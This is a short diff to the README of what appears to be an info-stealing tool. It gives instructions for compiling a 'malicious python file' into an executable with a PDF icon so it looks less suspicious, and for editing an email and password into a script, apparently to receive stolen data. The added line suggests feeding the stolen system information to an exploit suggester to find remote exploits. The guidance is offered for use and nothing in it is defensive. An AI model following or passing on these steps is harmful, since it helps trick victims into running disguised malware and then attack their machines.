@@ -30,6 +30,8 @@ this will install pyinstaller on your system
 
 This will compile the malicious python file to a executable and you may add icon of pdf to it using the --icon option to make it look less suspicious...
 
+*After Stealing the info you can copy it and write it to a text file which you can furthur use with windows exploit suggester to look for remote exploits*
+
 # USING
 
 after you have cloned the repository you can use the wrf.py file to edit the email and password in file...
